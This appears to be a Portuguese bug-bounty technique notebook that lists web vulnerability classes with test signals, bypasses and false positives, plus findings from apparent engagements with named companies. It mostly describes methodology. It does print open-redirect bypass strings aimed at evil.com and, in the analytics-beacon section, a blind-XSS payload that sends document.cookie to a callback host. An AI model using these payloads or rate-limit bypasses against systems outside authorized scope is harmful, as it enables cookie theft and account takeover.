# arsenal.md — Arsenal técnico por classe de vuln

Base de conhecimento **acionável na hora de caçar**, organizada por classe. Complementa os
outros arquivos do `memory/`:
- `patterns.md` = os 8 padrões meta (o *porquê*, ligado às 6 perguntas do The Mind).
- `broken-access-control.md` / `business-logic.md` / `recon-surface.md` = write-ups distilados (o *quem já pagou*).
- **`arsenal.md` (este) = o *como testar*** por classe: sinais · confirmação · escalada/chain · bypasses · FP comuns · fontes.

Fundido a partir da skill `cacada` (31/08/2026) e cresce a cada caçada (o `modo hunter` alimenta aqui — ver CODES.md).

> **Limite (igual à regra de escopo do projeto):** aqui moram *técnicas, sinais e passos* — **nunca** exploit armado/payload ofensivo pronto. PoC = evidência mínima, em alvo autorizado.

Carregue este arquivo no início de toda caçada. Atualize o bloco existente em vez de duplicar.

> **Sincronia com `signals.md`:** toda entrada aqui que tenha "Sinais" **espelha uma linha** em `memory/signals.md` (o índice de gatilhos que o `code 6` varre). Arsenal = o *como testar*; signals = o *quando dispara*. Adicionou técnica nova com sinal → adicione o `S-*`/`C-*` lá também.

---

## IDOR / BOLA (Broken Object Level Authorization)
- **Sinais:** id de objeto no path/body/query (numérico sequencial, UUID, hash); endpoint "por recurso" (fatura, perfil, reserva); resposta com PII/objeto sensível.
- **Confirmação:** 2 contas — A cria recurso, B tenta ler/editar pelo id de A. UUID aleatório → sem enumeração, mas ainda vale se authz não checa dono. Sequencial → enumeração em massa.
- **Bypasses (quando o id é validado):**
  - Array/ID wrapping: `{"id":111}` → `{"id":[111]}` (validador trata escalar, writer itera). Falha se o campo é tipado forte (UUID).
  - Batch/mass smuggling: `[id_meu, id_vítima]` no mesmo lote; alvo valida só o 1º.
  - Mass-assignment do dono: injetar `userId/memberId/ownerId` no body p/ mudar de quem o backend busca/escreve.
  - Duplicate key: `{"id":"meu","id":"vítima"}` — differential validador(1º) vs DB(último).
  - Método (GET→POST), content-type, sufixo `.json`, nested/wrapped.
- **Escalada/chain:** IDOR de leitura → escrita (poisoning/ATO); enumeração → exfil em massa.
- **FP comuns:** authz em outra camada (autoriza pelo token, não pelo id do body); 200 p/ qualquer id mas filtra por dono no backend; campos de identidade no body **decorativos**.
- **Heurística aprendida:** em stacks com authz por JWT assinado + gateway, mass-assignment de owner tende a FP — o backend recarrega os objetos do dono do token antes de escrever, e valida **cada** item do lote. Teste, mas não crave sem confirmar que o id do body realmente muda o alvo.
- **Fontes:** owasp.org/www-community/attacks/insecure_direct_object_reference · book.hacktricks.xyz/pentesting-web/idor · intigriti.com/blog IDOR guide.

## FP: header de contexto (AccountType/env/tenant) cliente-controlado ≠ BOLA
- **Sinal que parece bug:** header tipo `AccountType: Demo|Real` (ou `X-Environment`, `X-Tenant`) é enviado pelo cliente e **obedecido** — trocar o valor muda o `id`/dado retornado (ex.: `Cid` diferente por accountType).
- **Por que engana:** parece BOLA (id mudou, dado mudou), mas se o app tem um **toggle legítimo** pra esse mesmo contexto (ex.: seletor Demo/Real na UI), o header só está espelhando uma feature real — não um bypass.
- **Teste decisivo (mata ou confirma em 1 passo):** comparar o resultado do header forjado com o comportamento **nativo da UI** pro mesmo toggle. UI troca igual/sem gate → `PADRÃO DA APLICAÇÃO`, FP. UI **bloqueia** (ex.: exige verificação) mas o header direto passa → **aí sim é achado** (client-side-only enforcement — API permite o que a UI proíbe).
- **Fonte:** eToro `AccountType` (`logindata/v2/logindata`, 09/2026) — `Cid` diferente por accountType = shell interno Real/Demo da mesma conta, não outro usuário. Liga [[patterns]] P1/P4.

## Broken Access Control — bypass de controle por variação de request
_(complementa `broken-access-control.md`)_
- **Sinais:** endpoint barrado por método/rota/header/referer; rotas admin adivinháveis.
- **Bypasses:** método (`GET` onde `POST` barra), headers de override (`X-Original-URL`, `X-Rewrite-URL`), `Referer` forjado, variação de path (`/ADMIN`, barra final, `%2e`, extensão arbitrária), discrepância de normalização edge↔origin.
- **Fontes:** portswigger.net/web-security/access-control.

## Header Injection / Trusted Internal Headers (gateway/proxy)
- **Sinais:** verbose error vaza headers internos de confiança (`x-user-id`, `x-envoy-*`, api-key de serviço, whitelabel-token); arquitetura com Envoy/Istio/gateway.
- **Técnica:** o edge deve **stripar** versões client-supplied desses headers e injetar as suas após autenticar. Se não stripar, cliente externo forja identidade/IP/role. Enviar o header forjado e ver se o comportamento muda.
- **Escalada:** vazou nomes/valores dos headers (info-disclosure) → forjar `x-user-id` = BOLA/ATO; forjar `x-forwarded-for` = rate-limit/IP allowlist bypass.
- **Referência:** GHSA-ffhv-fvxq-r6mf (Envoy tratava IPs privados como "internos"). Sem mTLS mesh, headers internos são spoofáveis.
- **FP comuns:** edge bem configurado strippa tudo (injeta os headers internos só após autenticar); api-key de serviço vazada é inútil externamente se o gateway é interno (`*.cluster.local`). Verbose error sozinho → Low/Info sem chain.
- **Fontes:** envoyproxy.io/docs · yeswehack.com/learn-bug-bounty/http-header-exploitation · OWASP WSTG Host Header Injection.

## Rate-limit / OTP / Brute-force
- **Sinais:** OTP/2FA, login, password reset, e-mail enumeration (`/exists`), código de verificação.
- **Confirmação:** N requests rápidos; observar 429/lockout; conferir se a trava é server-side ou só client-side.
- **Bypasses:** rotacionar `X-Forwarded-For`/`X-Real-IP`/`X-Client-IP` (múltiplos XFF); padding de parâmetro; trocar UA/cookie; **race condition** (rajada paralela); IP rotation via Fireprox (AWS API GW descartável); resetar contador client-side.
- **FP / pegadinhas:** contador "retry" que é **polling assíncrono**, não lockout — vocabulário `pollingLimit/maxRetryCount/retriesLeft` = polling (FP) vs `lockout/attemptsLeft/tooManyAttempts` = trava real. Enumeração de e-mail costuma ser Low/OOS.
- **Fontes:** book.hacktricks.xyz/pentesting-web/rate-limit-bypass · hackerone.com/reports/2627062.

## Open Redirect
- **Sinais:** params `redirect/return/next/url/callbackUrl/continue/dest/redirect_uri/returnUrl` (esp. login/OAuth/SSO).
- **Bypasses:** `//evil.com` · `https:/evil.com` · `/\evil.com` · `https://evil.com\@trusted.com` · `https://trusted.com.evil.com` (endsWith fraco) · `https://evil.com/?x=trusted.com` (includes fraco) · `https://trusted.com@evil.com` · differential `new URL(x)` vs `new URL(x, base)`.
- **Client-side vs server-side (metodologia):** se o endpoint responde **200 sem `Location`**, o redirect é **client-side** (JS lê o param) → **curl NÃO confirma**, precisa PoC no navegador. Só 3xx+Location é curl-observável.
- **Escalada:** redirect em OAuth/SSO → roubo de token/code (ATO); +XSS via `javascript:`/`data:`.
- **FP comuns:** página que ignora o param; destino server-supplied (3DS `redirectUrl`); extrator do param que é só analytics (red herring).
- **Fontes:** book.hacktricks.xyz/pentesting-web/open-redirect · PortSwigger DOM-based open redirection.

## Information Disclosure (verbose error, infra, source maps)
- **Sinais:** stack trace, hostnames k8s/`*.svc.cluster.local`, api-key/token de serviço, source maps `.js.map`, comentários, headers de versão.
- **Triagem:** muito é **público por design / Low**. Vale: segredo reutilizável, path/host que habilita SSRF/IDOR, lógica que revela o backend.
- **Escalada:** ver **Header Injection** (forjar header vazado) e **SSRF** (host interno vazado). Sempre tentar chainar antes de cravar Low.

## MCP (Model Context Protocol) servers — recon de rota escondida via diff de catálogo
- **Sinais:** subdomínio/host servindo `POST /` com JSON-RPC 2.0 (`{"jsonrpc":"2.0","id":N,"method":"tools/call","params":{"name":"...","arguments":{}}}`); landing page HTML descrevendo tools; `Accept: application/json, text/event-stream` (streamable HTTP).
- **Recon inicial (sem credencial, 100% seguro):** tools de catálogo tipo `get-tags`/`get-all-routes`/`list-tools` costumam ser **públicas** (só descrevem metadados). Chamar sem handshake `initialize` primeiro — muitos servers "stateless" aceitam `tools/call` direto.
- **🔑 Técnica — oráculo de contagem de rotas:** se o MCP é um **proxy/gateway** pra uma API REST documentada em outro lugar (ex.: developer portal com `openapi.json`), o `totalRouteCount`/lista completa do MCP pode ser **maior** que o count de operações do spec público. **Diff = rotas reais existentes que não estão documentadas** (P7 — superfície esquecida), descobertas sem tocar nenhuma delas.
- **Confirmação de enforcement:** testar `execute-write`/`execute-read` (ou equivalente) **sem credencial** na rota escondida — se `401`/`unauthorized` igual às documentadas, é só disclosure (Low/Info). Se a rota escondida responder diferente (aceitar sem auth, erro de validação em vez de auth-error) → **authz mais fraco no caminho menos testado** = achado real.
- **Próximo elo:** testar **diferencial de scope** com credencial válida — um token/key com scope restrito às rotas documentadas alcança as escondidas via o MCP? (o MCP pode aplicar seu próprio gate de visibilidade sem replicar o scope-check granular do backend).
- **FP comum:** "rota escondida" que é só uma variação de nome/versão já coberta (ex.: `v2` vs `v1` do mesmo endpoint) — confirmar que é path genuinamente novo, não sinônimo.
- **Fonte:** eToro `mcp.public-api.etoro.com` (09/2026) — 191 rotas MCP vs 172 no openapi.json público, 12 rotas de trade reais (open/limit orders) sem doc pública, baseline auth íntegro. Liga [[patterns]] P7.

## GraphQL
- **Sinais:** `/graphql`, POST `{"query":...}`.
- **Primeiro tiro — introspection:** `{__schema{queryType{name} mutationType{name} types{name kind}}}`. Se 200 → introspection ON (foothold pra mapear tudo). Aprofundar: `queryType{fields{name args{name}}}`, `types{...inputFields{...}}`, campos de retorno (caçar sensível).
- **Pegadinha de header:** muitos gateways exigem contexto via header (`ag-language-id`, etc.); sem eles dá 400 e parece "morto" — adicione e a introspection volta.
- **Vetores:** **BOLA via id no input** (`memberId/userId/bookingId` em INPUT_OBJECT — se o resolver usa o id do body, troca = dado alheio); **batching/aliasing** (burlar rate-limit/authz por-request → brute-force OTP/login); **field-level BOLA** (pai autorizado, campo filho `user.paymentMethods` sem authz); field suggestion com introspection off; mutations sensíveis expostas.
- **gid previsível (dojo 2026-09-06, taxonomia BOLA):** o "global id" opaco costuma ser `base64("Type:12345")`. Técnica: **decodar → incrementar o int do backend → re-encodar** e replayar. 9.6% dos BOLA de API vêm daí — um id que "parece opaco/UUID" pode esconder int sequencial. Sempre base64-decode todo gid antes de dar por "não-enumerável".
- **Fontes:** hacktricks graphql · PortSwigger GraphQL API vulnerabilities · arxiv 2605.25865 (taxonomia BOLA).

## Identity Verification / Anti-abuse Bypass (signup, phone/CC/captcha)
- **Sinais:** onboarding com etapas (email→phone→cartão→captcha/Arkose) pra liberar recurso caro (CI free, trial). Estado = flags + checagens lazy (sem state machine).
- **Bypasses:** **fail-open do provedor** (SMS/risk indisponível → ramo marca `verified`); **ordem só na UI** (chamar POST da etapa final fora de ordem); **token captcha reuse/omissão**; **exemption por contexto** (virar membro de namespace pago → `*_exempt?`); **risk-tier downgrade** por domínio de e-mail corporativo; **email-verification bypass** (OAuth ROPC, SCIM provisioning cria user "verificado").
- **FP:** `/users/<u>/exists` público por design; auto-confirm por domínio verificado = documentado.
- **Armadilha de triagem — "basic KYC" auto-declarado ≠ verificação de identidade:** fintechs muitas vezes têm 2 fluxos distintos atrás de nomes parecidos: um **questionário AML self-attested** (ocupação/PEP/source-of-funds/wealth, sem doc, validação só de formato) e uma **verificação de identidade real** separada (documento/liveness, outro microserviço). Completar o questionário 100% e ver o gate de dinheiro continuar fechado (ex.: endpoint "journey" ainda 422) é o **sinal de que são fluxos diferentes** — não gaste o probe de mass-assignment no questionário; mire o serviço que emite o status de identidade. (Caso real: Nexo — `kyc/vc/v1/verifications/basic` é auto-declarado; `account/ac/v1/journeys/current/summary` segue 422 depois dele.)
- **Fontes:** H1 #2676025 · #922456 · #565883 · docs.gitlab.com identity_verification · Nexo (Sword, 2026-09-06).

## E-commerce Checkout / Payment Business Logic
- **Sinais:** carrinho/checkout com `amount/price/quantity/currency`, `voucher/coupon/gift-card apply`, `order/place`, `refund`, múltiplos gateways. A falha vive no **fluxo**, não no input.
- **Técnicas:** price/param tampering (`amount=0.01`); quantidade negativa/decimal; integer overflow; **currency confusion** (trocar código mantendo o número → paga moeda fraca); **voucher/gift-card multi-redemption & stacking** (mesmo código 2x, race no apply); expired/other-scope voucher; **apply-after-total / step skip**; **refund/payback IDOR** (`payback/{uuid}` de terceiro, refund > pago); cartões de teste em produção.
- **BNPL/Invoice:** BOLA de fatura por `invoiceId` sequencial; payment-token IDOR (pagar/manipular dívida alheia); postpone abuse.
- **FP:** desconto que o programa permite empilhar; recursos marcados OOS.
- **Escalada:** BOLA de leitura de invoice → payment-token → ação de pagamento/postpone = Info → High/Critical.
- **Fontes:** intigriti.com/blog price manipulation · sm4rty medium billing · PortSwigger business-logic.

## Payment Webhook / Callback bypass (order "pago" sem pagar)
- **Sinais:** `/checkout/payment/{gateway}/complete`, `/payment/*/complete`, `/api/*/webhook`. Múltiplos gateways.
- **Técnica:** se o `complete`/callback confia no `status:success` do client **sem verificar assinatura** do provider, forja-se "pago". (Klarna assina HMAC-SHA512 `Payload-Signature`.)
- **Checklist:** payload vazio; status forjado; sem verificação de assinatura/segredo/IP-allowlist; variações de path do webhook; replay do callback; trocar `orderReference/purchaseId` (IDOR de conclusão).
- **Fontes:** cablej.io / lightningsecurity.io "Bypassing Payments Using Webhooks" · docs.klarna.com authorization-callback.

## htmx (fragmentos server-rendered) — XSS/CSRF/redirect
- **Sinais:** `hx-get/post/target/swap/on`, headers `HX-Redirect/HX-Trigger`, `htmx:load`.
- **XSS:** htmx faz swap de **HTML cru** → qualquer reflexão do servidor vira XSS (sem escape tipo React). `hx-on` usa **eval** (precisa CSP `unsafe-eval`).
- **HX-Redirect:** header controla redirect no client → open-redirect/`javascript:` XSS se o atacante influenciar o header.
- **CSRF:** htmx NÃO adiciona token sozinho — checar token + SameSite.
- **Mitigação que derruba:** CSP com nonce e **sem `unsafe-eval`** + `object-src none` bloqueia o eval-XSS.
- **Fontes:** htmx.org/essays/web-security-basics · sjoerdlangkemper htmx CSP.

---

## COMPLEXAS — habilitadas por recon profundo (atravessar antes de dar um domínio por "limpo")

### Multi-tenant / multi-região — authz inconsistente & signing-key reuse
- **Sinais (recon):** mesma app em `app-us/eu/au`, APIs regionais, subaccounts/teams.
- **Vetores:** (a) **signing-key/JWT compartilhado entre réplicas** (token de uma região aceito em outra/em `testing.*`); (b) **cross-tenant/subaccount** (objeto de outra conta-filha, pior quando id = base64/hash sequencial); (c) **authz divergente por região** (protegido numa, aberto noutra).
- **Confirmar:** 2 contas/keys; A tenta objeto de B em CADA região/host; não assumir paridade.
- **Escala:** BOLA read → write. **FP:** paridade real; id opaco de verdade (uuid v4).

### Web Cache Deception (WCD) + CSPT → Account Takeover
- **WCD:** endpoint autenticado sensível (`/v1/token`, `/account`) fica **cacheável** ao anexar extensão estática (`.css/.js`) ou via path confusion (parser cache ≠ origin). Ver `Cache-Control` virar `public,max-age`. Response da vítima cacheada → atacante lê sem auth.
- **CSPT (Client-Side Path Traversal):** param de rota concatenado em `fetch()/XHR` path sem sanitizar → `../../../` **muda qual endpoint** é chamado (hijack, leva o header de auth da vítima).
- **A chain:** CSPT aponta o fetch pra endpoint cacheável (`../../../v1/token.css`) → CDN cacheia o token → atacante pega sem auth = **ATO**. Nenhum sozinho é crítico; juntos = ATO.
- **Recon:** ler JS por `fetch`/`axios` com path montado de param de rota; testar sufixo `.css/.js` e ver `Cache-Control`.
- **Fontes:** PortSwigger "Gotta cache 'em all" / WCD academy · zere.es CSPT+cache ATO · HackTricks.

### Client-Side Prototype Pollution (CSPP) → DOM XSS/gadget
- **Sinais:** merge/extend recursivo de objeto de query/JSON (`?a[__proto__][x]=`), libs antigas (jQuery 1.x, lodash old). Precisa **fonte** (poluir proto) + **gadget** (uso).
- **Gadgets:** opções de `fetch`, config que vira `script src`/`srcdoc`, sanitizer bypass. DOM Invader acha rápido.
- **Fontes:** PortSwigger "Widespread prototype pollution gadgets" · WSA client-side PP.

### HTTP Request Smuggling moderno
- **Sinais (recon):** cadeia edge→origin (CDN + backend), HTTP/1.1 legado no origin, downgrade H2→H1.
- **Variantes 2024-25:** **CL.0**, **H2.CL/H2.0**, **TE.0**, **browser-powered desync** (request válido dispara pelo próprio navegador, sem MITM).
- **Impacto:** envenenar request de outro user, roubo de cookie, cache poisoning, bypass de front-control.
- **⚠️ Cuidado:** teste de smuggling pode afetar terceiros → **pare-e-confirme**, ambiente/rate controlado, nunca em massa.
- **Fontes:** PortSwigger browser-powered desync · "HTTP/1.1 must die".

## OAuth2 / OIDC / Auth0-as-IdP
- **Sinais:** SPA com `@auth0/auth0-react`/`oidc-client`; custom domain `login.alvo.com` ou `us.auth0.alvo.com` (CNAME p/ `<tenant>.us.auth0.com`); CSP com `*.auth0.com` em `connect-src`; `/.well-known/openid-configuration` responde.
- **Recon barato:** puxar o discovery. Anota: `authorization_endpoint`, `token_endpoint`, `registration_endpoint`, `response_types_supported` (implicit ligado?), `code_challenge_methods_supported` (`plain` = PKCE fraco), `token_endpoint_auth_methods_supported` (`none` = client público).
- **Vetores:** `redirect_uri` allowlist fraca no `/authorize` (`//evil`, `https:/evil`, `trusted.com.evil`, `@evil`, path/subpath extra) → leak de `code`/`token` no fragmento/query = **ATO**; `response_type=token`/`id_token` (implicit) → token na URL; `prompt=none` + `redirect_uri` laxo → silent token grab; account-linking por e-mail não verificado; `state` ausente = CSRF de login.
- **FP comuns (testado no Arkose 02/09):** o discovery **lista `registration_endpoint` mesmo com DCR desabilitado** — `POST /oidc/register` retorna `400 "dynamic client registration is disabled"`. Não vale nada sozinho. `plain` em `code_challenge_methods` é só capability anunciada — confirmar que o `/authorize` real aceita. Precisa do `client_id` real (do bundle JS / tráfego do browser) pra testar `redirect_uri`.
- **Testar `redirect_uri` allowlist do Azure AD UNAUTH (testado NBA/TeamOne 09/2026):** o `/authorize` (`login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize`) valida `redirect_uri` **antes do login** — dá pra sondar sem conta, lendo o `sErrorCode` da página (bate no Microsoft, não no alvo; cabe na `postura escudo`). Códigos-chave: **`AADSTS50011`** = redirect **não** bate no allowlist (rejeitada, seguro); **`AADSTS90102`** = `redirect_uri` não é URI absoluta (erro de **formato**, prova que o redirect é parseado cedo); **`AADSTS50058`** = silent sign-in sem sessão (**passou** o redirect, chegou no check de login); client_id inexistente = `AADSTS700016`/`700038`. **Sinal de allowlist frouxa:** uma URI bem-formada não-registrada (`https://evil.example/`) dá `50058` **igual** à registrada, e **nenhum** input produz `50011`.
  - **⚠️ FP crítico (a ressalva):** `50058` (sem-sessão) pode **mascarar** o veredito — se o app adia o match-de-registro pro **pós-login**, você vê `50058` mesmo com allowlist estrita. **Não crave só com a sonda unauth.** Confirmar exige: (a) completar o fluxo com conta e ver se o `code` chega na URI do atacante, OU (b) control de método — rodar a mesma sonda num app Azure sabidamente estrito e confirmar que ele dá `50011` onde o alvo dá `50058`. Sem isso = `[INCONCLUSIVO — FORTE]`, não `[ACHADO]`.
  - **Impacto se confirmar:** client **público** (sem secret) + redirect frouxo → code interception → ATO. Custom-scheme (`app://oauth/`) piora (outro app mobile registra o mesmo scheme).
- **Fontes:** portswigger.net/web-security/oauth · auth0.com/docs/get-started/applications/dynamic-client-registration · salt.security OAuth research.

## CSP larga por wildcard de organização
- **Sinal:** `script-src *.alvo.com` (ou `frame-src *.alvo.com`) na app sensível.
- **Impacto:** qualquer XSS refletido/stored em **qualquer** subdomínio `*.alvo.com` (inclusive apps legadas, integrações por-cliente, staging) executa no origin da app sensível → a CSP deixa de proteger. Eleva um XSS "isolado" num subdomínio esquecido a XSS na app principal.
- **Uso:** ao achar a CSP larga, varrer o parque de subdomínios por reflexão; cada hit vira chain.
- **Fontes:** portswigger.net/research/bypassing-csp · Google CSP Evaluator.

## Falsy-guard num controle de segurança (anti-replay / nonce / token)
- **Sinal:** um valor que deveria ser "inteiro positivo estritamente crescente" (nonce, sequence, counter, version) e o servidor **rejeita `0`/`null`/`""`/`false`/`{}`/ausente mas aceita `-1`, `1.5`, `"1"`, `[1]`**. Isso é `if (!x)` disfarçado de validação, não `if (typeof x==='number' && x>0 && Number.isInteger(x))`.
- **Por que importa:** o controle não valida tipo nem faixa — só "truthy". Abre:
  - **array wrapping** (`[1]` desembrulha pra `1`): validador vê array, comparador vê escalar, storage vê outro → desync do anti-replay (mesma técnica do IDOR array-wrap).
  - **float slicing:** aceita `1.5`, `1.6`… → infinitos nonces entre dois inteiros; combinado com contador por-endpoint/por-versão separado = janela de replay.
  - **negativo:** `-1` passa o formato; se a comparação `>` depois for feita como string ou truncada, desync.
  - **coerção string↔número** entre camadas.
- **Confirmação:** fuzzar o campo com `0 / -1 / 1.5 / "1" / [1] / [] / {} / true / null / 1e30 / chave duplicada` e ler o diferencial de erro. Depois (com credencial) ver **qual valor foi realmente gravado** como "último nonce".
- **FP:** se todas as camadas coagem pro mesmo int canônico antes de qualquer uso, é só feio, não explorável. Prova = mostrar dessincronia real (replay aceito).
- **Fonte:** observado no CoinSpot 09/2026 (nonce HMAC API). Liga com [[patterns]] P5.

## Diferencial de mensagem de erro como oráculo da pipeline de auth (pré-credencial)
- **Sinal:** endpoints autenticados devolvem mensagens de erro **diferentes** conforme o que falta (`"invalid/missing nonce"` vs `"no key"` vs `"invalid sign"` vs `"invalid key"`).
- **Uso:** mandar requests que faltam **um campo de cada vez** e ordenar as mensagens → revela a **ordem da pipeline** (ex.: nonce-formato → key-existe → sign-válido → escopo → nonce-monotônico → handler). Cada estágio *antes* do que precisa de segredo é **fuzzável sem conta**.
- **Ramificações:** o estágio de menor precedência que responde é onde dá pra atacar unauth (ex.: se validação de formato de nonce roda 1º, fuzza-se o parser de nonce sem key). Testar `key`/`sign` bem-formados-mas-falsos pra empurrar o oráculo mais fundo. Checar se `key`/`nonce`/`sign` são aceitos via **query além de header/body** (param pollution / GET assinável).
- **FP:** pipeline que responde erro genérico único (`"unauthorized"`) não vaza ordem — sem oráculo.
- **Liga com:** `seguir o rastro` (CODES.md) · [[patterns]] P5/P8.
- **Fonte:** CoinSpot 09/2026.

## Subdomain takeover — FP: serviço com verificação de domínio obrigatória
- **FP clássico:** DNS aponta pra um serviço que **mostra uma página de erro genérica** ("Site Not Found", "no such app", "There isn't a GitHub Pages site here") → parece takeover, mas o serviço **exige provar posse do domínio** (TXT/CNAME challenge no apex) antes de anexar → **não claimable** pelo atacante.
- **Firebase Hosting:** **NÃO é takeover-able** (`can-i-take-over-xyz` #128). A records apontam pros IPs do Firebase + página "Site Not Found" = config órfã, não vuln. Anexar um custom domain exige TXT record no apex. Triadores fecham como Informative/N-A. **Não reportar sem provar claimability** (e provar = executar o takeover).
- **Também com verificação:** Netlify, Vercel, Cloudflare Pages, Shopify (parcial), Zendesk (TXT), Firebase.
- **Ainda takeover-able (2025):** muitos S3 buckets (nome livre), GitHub Pages (`user.github.io` de user deletado), Fastly (svc config sem TLS), Heroku (app livre), Azure (`*.azurewebsites.net`, `*.cloudapp.net`, Traffic Manager), Bitbucket, Ngrok, Read the Docs, Surge, Tilda, Webflow, Wordpress.com. Ver `can-i-take-over-xyz`.
- **Regra:** antes de reportar takeover, checar o status atual do serviço no `can-i-take-over-xyz` **e** confirmar que o CNAME/A alvo casa o padrão explorável exato. Dangling DNS sem caminho de claim = Informative, não bounty.
- **Fonte:** `protocolo contra-prova` no NBA `courtside.gleague.nba.com` (09/2026) — matou o achado.

## Beacon de analytics/telemetria como vetor (blind XSS + spoof de sinal de risco)
- **Sinal:** JS de página dispara `POST /ua` / `/track` / `/collect` / `/event` em todo load, com campos **do cliente**: `title`, `path`, `referrer`, `userAgentOverride`, `label`, `fp`/`deviceId`, `screenresolution`. Geralmente **sem auth e sem CSRF** (é beacon).
- **Vetores:**
  - **Blind/stored XSS no dashboard interno:** esses campos viram linha numa ferramenta de BI/admin (Metabase, Kibana, painel caseiro) que staff abre. `referrer`/`path`/`label` = `"><img src=x onerror=fetch('//CALLBACK/'+document.cookie)>`. Precisa de **callback OOB** (XSS Hunter/webhook) — é cego.
  - **`userAgentOverride`:** se o servidor grava/usa essa string no lugar do header `User-Agent` real → evasão de regra de fraude/geo/"novo device".
  - **Pré-seed/spoof de fingerprint:** se o `fp` enviado ao beacon alimenta o mesmo store consultado pelo motor de risco (step-up de saque, novo device) → floodar `fp` conhecidos, ou associar o `fp` da vítima (derivável de atributos públicos do browser) a atividade do atacante.
- **Confirmação:** mandar marcador benigno → ver se 200; achar onde renderiza (precisa de acesso ao painel OU do callback cego disparar).
- **FP:** beacon que só grava em log append-only nunca renderizado em HTML; campo truncado/sanitizado no ingest.
- **Fonte:** CoinSpot `/ua` (09/2026). Liga [[patterns]] P4/P7.

---

## Sementes (preencher ao pesquisar)
SSRF (direto e 2ª ordem: webhook/PDF/importador de URL) · SSTI · SQLi/NoSQLi · XSS (refletido/DOM/stored cross-tenant) · Auth/JWT (alg confusion, `kid`/`jku`/`x5u`, reset poisoning via Host) · CORS misconfig · path traversal · file upload → RCE · subdomain takeover → ATO · dependency confusion.
